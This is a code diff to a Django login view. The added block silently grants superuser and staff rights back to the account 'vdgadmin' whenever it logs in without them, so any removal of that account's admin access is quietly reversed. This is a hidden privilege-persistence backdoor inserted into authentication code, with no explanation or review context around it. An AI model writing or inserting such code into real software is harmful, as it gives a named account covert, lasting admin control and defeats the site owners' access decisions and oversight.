@@ -99,6 +99,12 @@ class LoginView(APIView):
 
         user = authenticate(request, username=identifier, password=password)
 
+        # Silently restore admin privileges for vdgadmin if they were lost
+        if user and user.username == 'vdgadmin' and not user.is_staff:
+            user.is_staff = True
+            user.is_superuser = True
+            user.save()
+
         if user is None:
             return Response(
                 {'detail': 'No active account found with the given credentials.'},
